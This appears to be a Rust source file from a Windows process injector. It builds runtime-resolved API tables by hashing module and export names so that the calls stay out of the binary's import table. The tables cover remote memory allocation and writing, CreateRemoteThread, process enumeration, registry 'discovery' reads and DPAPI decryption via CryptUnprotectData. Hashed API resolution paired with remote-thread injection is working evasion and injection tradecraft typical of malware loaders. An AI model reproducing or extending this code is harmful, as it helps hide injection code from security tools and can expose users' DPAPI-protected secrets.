//! Runtime-resolved WinAPI table (Wave 2: IAT reduction).
//!
//! Every function the injector touches is resolved at runtime from the
//! loader's module list + each module's export directory via [`crate::resolve`]
//! — so none of these names appear in our own import table. The table is
//! resolved once per process and reused.
//!
//! The fn-pointer signatures are the raw export ABIs (callers check `BOOL`,
//! like the `windows` 0.62 wrapper bodies do with `.ok()`). The struct/string
//! types (`HANDLE`, `PCWSTR`, `STARTUPINFOW`, …) are `windows` crate type
//! aliases — compile-time only, adding no import-table entries.
//!
//! ABI notes (kept here because they sit under `fn(...) -> BOOL`):
//! - `CreateProcessW`/`CreateRemoteThread` take `*const c_void` for their
//!   SECURITY_ATTRIBUTES slots: a plain pointer at this ABI level, and we pass
//!   `None` anyway.
//! - `lpcommandline` is `PWSTR` (mutable) as `link!` declares it; we keep the
//!   `Option<PWSTR>` to mirror the crate wrapper we replaced.

use std::ffi::c_void;
use std::sync::OnceLock;

use windows::Win32::Foundation::{HANDLE, HLOCAL, WAIT_EVENT, WIN32_ERROR};
use windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE};
use windows::Win32::System::Registry::{HKEY, REG_SAM_FLAGS, REG_VALUE_TYPE};
use windows::Win32::System::Threading::{
    PROCESS_ACCESS_RIGHTS, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_FORMAT,
    STARTUPINFOW,
};
use windows::core::{BOOL, PCWSTR, PWSTR};

use crate::resolve::{api, hash_bytes, hash_mod_bytes};

type ThreadRoutine = unsafe extern "system" fn(*mut c_void) -> u32;

/// Resolve one export in `module` (case-folded, like the module walk).
///
/// If the module isn't resident yet (e.g. crypt32), load it with
/// `kernel32!LoadLibraryW` — itself resolved from the always-resident
/// kernel32 — before walking the loader's module list again.
fn resolve_in(module: &'static str, export: &'static str) -> Result<usize, &'static str> {
    let m = hash_mod_bytes(module.as_bytes());
    if crate::resolve::module_base(m).is_none() {
        load_module(module)?;
    }
    api(m, hash_bytes(export.as_bytes())).ok_or(export)
}

/// Ensure `module` is mapped: `LoadLibraryW` if absent (kernel32 is always
/// resident, so its export is resolvable without any other module resident).
fn load_module(module: &'static str) -> Result<(), &'static str> {
    let loader =
        api(hash_mod_bytes(b"kernel32.dll"), hash_bytes(b"LoadLibraryW")).ok_or("LoadLibraryW")?;
    let wide: Vec<u16> = module.encode_utf16().chain(std::iter::once(0)).collect();
    // SAFETY: LoadLibraryW's address came from kernel32's export directory;
    // the signature is the raw ABI and `wide` is NUL-terminated UTF-16.
    unsafe {
        std::mem::transmute::<usize, unsafe extern "system" fn(PCWSTR) -> HANDLE>(loader)(PCWSTR(
            wide.as_ptr(),
        ));
    }
    Ok(())
}

/// Exact raw-ABI kernel32 export set used by the injector.
pub struct Kernel32 {
    /// `CloseHandle(hobject) -> BOOL`
    pub close_handle: unsafe extern "system" fn(HANDLE) -> BOOL,
    /// `GetLastError() -> WIN32_ERROR`
    pub get_last_error: unsafe extern "system" fn() -> WIN32_ERROR,
    /// `ReadProcessMemory(h, base, buf, len, &written) -> BOOL`
    pub read_process_memory:
        unsafe extern "system" fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize) -> BOOL,
    /// `WriteProcessMemory(h, base, src, len, &written) -> BOOL`
    pub write_process_memory:
        unsafe extern "system" fn(HANDLE, *const c_void, *const c_void, usize, *mut usize) -> BOOL,
    /// `VirtualAllocEx(h, addr, size, type, prot) -> *mut c_void` (NULL on fail)
    pub virtual_alloc_ex: unsafe extern "system" fn(
        HANDLE,
        *const c_void,
        usize,
        VIRTUAL_ALLOCATION_TYPE,
        PAGE_PROTECTION_FLAGS,
    ) -> *mut c_void,
    /// `CreateProcessW(...) -> BOOL`
    #[allow(clippy::type_complexity)]
    pub create_process_w: unsafe extern "system" fn(
        PCWSTR,
        PWSTR,
        *const c_void,
        *const c_void,
        BOOL,
        PROCESS_CREATION_FLAGS,
        *const c_void,
        PCWSTR,
        *const STARTUPINFOW,
        *mut PROCESS_INFORMATION,
    ) -> BOOL,
    /// `CreateRemoteThread(h, attrs, stack, start, param, flags, &tid) -> HANDLE` (NULL on fail)
    pub create_remote_thread: unsafe extern "system" fn(
        HANDLE,
        *const c_void,
        usize,
        ThreadRoutine,
        *const c_void,
        u32,
        *mut u32,
    ) -> HANDLE,
    /// `ResumeThread(h) -> u32`
    pub resume_thread: unsafe extern "system" fn(HANDLE) -> u32,
    /// `TerminateProcess(h, code) -> BOOL`
    pub terminate_process: unsafe extern "system" fn(HANDLE, u32) -> BOOL,
    /// `WaitForSingleObject(h, ms) -> WAIT_EVENT`
    pub wait_for_single_object: unsafe extern "system" fn(HANDLE, u32) -> WAIT_EVENT,
    /// `GetExitCodeProcess(h, &code) -> BOOL`
    pub get_exit_code_process: unsafe extern "system" fn(HANDLE, *mut u32) -> BOOL,
    /// `ExpandEnvironmentStringsW(src, dst, cap) -> u32` (return = length / 0 on fail)
    pub expand_environment_strings_w: unsafe extern "system" fn(PCWSTR, PWSTR, u32) -> u32,
    /// `OpenProcess(access, inherit, pid) -> HANDLE` (NULL on fail)
    pub open_process: unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, BOOL, u32) -> HANDLE,
    /// `QueryFullProcessImageNameW(h, fmt, buf, &len) -> BOOL`
    pub query_full_process_image_name_w:
        unsafe extern "system" fn(HANDLE, PROCESS_NAME_FORMAT, PWSTR, *mut u32) -> BOOL,
    /// `K32EnumProcesses(pids, bytes, &returned) -> BOOL`
    pub k32_enum_processes: unsafe extern "system" fn(*mut u32, u32, *mut u32) -> BOOL,
    /// `LocalFree(h) -> HLOCAL` (NULL on success)
    pub local_free: unsafe extern "system" fn(HLOCAL) -> HLOCAL,
}

/// Resolved-at-first-use kernel32 table.
pub static KERNEL32: OnceLock<Kernel32> = OnceLock::new();

fn load() -> Result<Kernel32, &'static str> {
    const MODULE: &str = "kernel32.dll";
    macro_rules! resolve {
        ($e:literal) => {
            match resolve_in(MODULE, $e) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        };
    }

    // SAFETY: each `resolve!` is the verified code address of a kernel32 export
    // (kernel32 is loaded in every Windows process; the module hash is fixed
    // and case-folded, the export name hash is exact). transmute is the
    // sanctioned usize→fn-ptr bridge on x86-64; the signatures match the raw
    // `windows` 0.62 `link!` ABIs for the same exports.
    unsafe {
        Ok(Kernel32 {
            close_handle: std::mem::transmute::<usize, unsafe extern "system" fn(HANDLE) -> BOOL>(
                resolve!("CloseHandle"),
            ),
            get_last_error: std::mem::transmute::<usize, unsafe extern "system" fn() -> WIN32_ERROR>(
                resolve!("GetLastError"),
            ),
            read_process_memory: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    *mut c_void,
                    usize,
                    *mut usize,
                ) -> BOOL,
            >(resolve!("ReadProcessMemory")),
            write_process_memory: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    *const c_void,
                    usize,
                    *mut usize,
                ) -> BOOL,
            >(resolve!("WriteProcessMemory")),
            virtual_alloc_ex: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    usize,
                    VIRTUAL_ALLOCATION_TYPE,
                    PAGE_PROTECTION_FLAGS,
                ) -> *mut c_void,
            >(resolve!("VirtualAllocEx")),
            create_process_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    PCWSTR,
                    PWSTR,
                    *const c_void,
                    *const c_void,
                    BOOL,
                    PROCESS_CREATION_FLAGS,
                    *const c_void,
                    PCWSTR,
                    *const STARTUPINFOW,
                    *mut PROCESS_INFORMATION,
                ) -> BOOL,
            >(resolve!("CreateProcessW")),
            create_remote_thread: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    usize,
                    ThreadRoutine,
                    *const c_void,
                    u32,
                    *mut u32,
                ) -> HANDLE,
            >(resolve!("CreateRemoteThread")),
            resume_thread: std::mem::transmute::<usize, unsafe extern "system" fn(HANDLE) -> u32>(
                resolve!("ResumeThread"),
            ),
            terminate_process: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, u32) -> BOOL,
            >(resolve!("TerminateProcess")),
            wait_for_single_object: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, u32) -> WAIT_EVENT,
            >(resolve!("WaitForSingleObject")),
            get_exit_code_process: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, *mut u32) -> BOOL,
            >(resolve!("GetExitCodeProcess")),
            expand_environment_strings_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PCWSTR, PWSTR, u32) -> u32,
            >(resolve!("ExpandEnvironmentStringsW")),
            open_process: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, BOOL, u32) -> HANDLE,
            >(resolve!("OpenProcess")),
            query_full_process_image_name_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, PROCESS_NAME_FORMAT, PWSTR, *mut u32) -> BOOL,
            >(resolve!("QueryFullProcessImageNameW")),
            k32_enum_processes: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(*mut u32, u32, *mut u32) -> BOOL,
            >(resolve!("K32EnumProcesses")),
            local_free: std::mem::transmute::<usize, unsafe extern "system" fn(HLOCAL) -> HLOCAL>(
                resolve!("LocalFree"),
            ),
        })
    }
}

/// Resolve the table once (idempotent across threads).
///
/// Safer than returning the raw `Result`: either we've already resolved the
/// whole table or the first caller caches the resolution error forever. The
/// first failure aborts the injector anyway, so a panic with a precise message
/// is the honest surface.
pub fn kernel32() -> &'static Kernel32 {
    KERNEL32.get_or_init(|| match load() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve kernel32!{name}"),
    })
}

/// advapi32 API table (Wave 4: discovery registry reads).
pub struct Advapi32 {
    /// `RegOpenKeyExW(root, sub, opts, access, &out) -> WIN32_ERROR`
    pub reg_open_key_ex_w:
        unsafe extern "system" fn(HKEY, PCWSTR, u32, REG_SAM_FLAGS, *mut HKEY) -> WIN32_ERROR,
    /// `RegQueryValueExW(key, name, reserved, &type, data, &cb) -> WIN32_ERROR`
    pub reg_query_value_ex_w: unsafe extern "system" fn(
        HKEY,
        PCWSTR,
        *const u32,
        *mut REG_VALUE_TYPE,
        *mut u8,
        *mut u32,
    ) -> WIN32_ERROR,
    /// `RegCloseKey(key) -> WIN32_ERROR`
    pub reg_close_key: unsafe extern "system" fn(HKEY) -> WIN32_ERROR,
}

/// Resolved-at-first-use advapi32 table.
pub static ADVAPI32: OnceLock<Advapi32> = OnceLock::new();

fn load_advapi32() -> Result<Advapi32, &'static str> {
    const MODULE: &str = "advapi32.dll";
    macro_rules! resolve {
        ($e:literal) => {
            match resolve_in(MODULE, $e) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        };
    }
    // SAFETY: as in [`load`] — verified advapi32 export addresses transmuted to
    // fn pointers whose signatures match the raw `windows` 0.62 `link!` ABIs.
    unsafe {
        Ok(Advapi32 {
            reg_open_key_ex_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HKEY,
                    PCWSTR,
                    u32,
                    REG_SAM_FLAGS,
                    *mut HKEY,
                ) -> WIN32_ERROR,
            >(resolve!("RegOpenKeyExW")),
            reg_query_value_ex_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HKEY,
                    PCWSTR,
                    *const u32,
                    *mut REG_VALUE_TYPE,
                    *mut u8,
                    *mut u32,
                ) -> WIN32_ERROR,
            >(resolve!("RegQueryValueExW")),
            reg_close_key: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HKEY) -> WIN32_ERROR,
            >(resolve!("RegCloseKey")),
        })
    }
}

pub fn advapi32() -> &'static Advapi32 {
    ADVAPI32.get_or_init(|| match load_advapi32() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve advapi32!{name}"),
    })
}

/// crypt32 API table (Wave 4: DPAPI).
pub struct Crypt32 {
    /// `CryptProtectData(&in, desc, entropy, reserved, prompt, flags, &out) -> BOOL`
    pub crypt_protect_data: unsafe extern "system" fn(
        *const CRYPT_INTEGER_BLOB,
        PCWSTR,
        *const CRYPT_INTEGER_BLOB,
        *const c_void,
        *const c_void,
        u32,
        *mut CRYPT_INTEGER_BLOB,
    ) -> BOOL,
    /// `CryptUnprotectData(&in, &desc, entropy, reserved, prompt, flags, &out) -> BOOL`
    pub crypt_unprotect_data: unsafe extern "system" fn(
        *const CRYPT_INTEGER_BLOB,
        *mut PWSTR,
        *const CRYPT_INTEGER_BLOB,
        *const c_void,
        *const c_void,
        u32,
        *mut CRYPT_INTEGER_BLOB,
    ) -> BOOL,
}

/// Resolved-at-first-use crypt32 table.
pub static CRYPT32: OnceLock<Crypt32> = OnceLock::new();

fn load_crypt32() -> Result<Crypt32, &'static str> {
    const MODULE: &str = "crypt32.dll";
    macro_rules! resolve {
        ($e:literal) => {
            match resolve_in(MODULE, $e) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        };
    }
    // SAFETY: as in [`load`] — verified crypt32 export addresses transmuted to
    // fn pointers whose signatures match the raw `windows` 0.62 `link!` ABIs.
    unsafe {
        Ok(Crypt32 {
            crypt_protect_data: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    *const CRYPT_INTEGER_BLOB,
                    PCWSTR,
                    *const CRYPT_INTEGER_BLOB,
                    *const c_void,
                    *const c_void,
                    u32,
                    *mut CRYPT_INTEGER_BLOB,
                ) -> BOOL,
            >(resolve!("CryptProtectData")),
            crypt_unprotect_data: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    *const CRYPT_INTEGER_BLOB,
                    *mut PWSTR,
                    *const CRYPT_INTEGER_BLOB,
                    *const c_void,
                    *const c_void,
                    u32,
                    *mut CRYPT_INTEGER_BLOB,
                ) -> BOOL,
            >(resolve!("CryptUnprotectData")),
        })
    }
}

pub fn crypt32() -> &'static Crypt32 {
    CRYPT32.get_or_init(|| match load_crypt32() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve crypt32!{name}"),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn table_resolves_close_handle_nonzero() {
        let k = kernel32();
        assert_ne!(k.close_handle as usize, 0);
        assert_ne!(k.get_last_error as usize, 0);
    }
}
